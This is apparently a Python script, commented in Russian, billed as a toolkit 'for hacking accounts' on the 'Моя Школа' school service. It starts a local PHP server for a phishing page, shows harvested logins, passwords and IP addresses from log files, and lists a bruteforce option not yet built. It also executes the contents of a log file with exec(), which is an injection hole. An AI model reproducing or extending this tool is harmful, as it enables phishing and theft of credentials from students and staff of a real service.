########################################################
# Инструмент для атак на аккаунты  сервиса "Моя Школа "#
# Версия: BETA                                         #           #
# Написан автором "fuckwbored"                         #
# Я НЕ РУЧАЮСЬ ЗА ВАШИ ДЕЙСТВИЯ И    # НАНЕСЕННЫЙ УЩЕРБ#                                      #
########################################################
import os, sys, time
from time import sleep
from prettytable import PrettyTable

# link checker & localhost starter function
def link_check():
	ports = input("\033[32m[Enter port]:\033[0m ")
	time.sleep(0.9)
	print("Link -> http://localhost:"+str(ports)) 
	link = input("continiue? ")
	if link == "y":
			os.system("cd site && php -S localhost:"+str(ports))
	elif link == "n":
		link_check()

# logs function (with tables)						
x = PrettyTable()
x.field_names = ['\033[31mCeть', 'Логин', 'Пароль', 'Ве', 'IP\033[0m ']
g=0
exec(open('site/data.log').read())
os.system("echo ------------------------------------------------------------------")
# main menu
print(f"""

'\033[31m  _____    _________ ___ ___    
  /     \  /   _____//   |   \|    |/ _|              |Coded by: Daniil| 
 /  \ /  \ \_____  \/    ~    \      <                |Version: BETA   |
/    Y    \/        \    Y    /    |  \               |Made with love  |
\____|__  /_______  /\___|_  /|____|__ \             
        \/        \/       \/         \/     \033[36m'""")
print("MSHK ToolKit")
time.sleep(0.5)
print("For hacking accounts :D")
time.sleep(0.6)
print("0. logs")
print("1. phishing webpage")
print("2. bruteforce")

while True:
	option = input("--> ")

	if option == "0":
		print(x)
		os.system("cd site && cat ip.txt")
	elif option == "1":
		link_check()
	elif option == "2":
		print("will available soon ! :)")
		print("in full version")
	else:
		print("Error!")
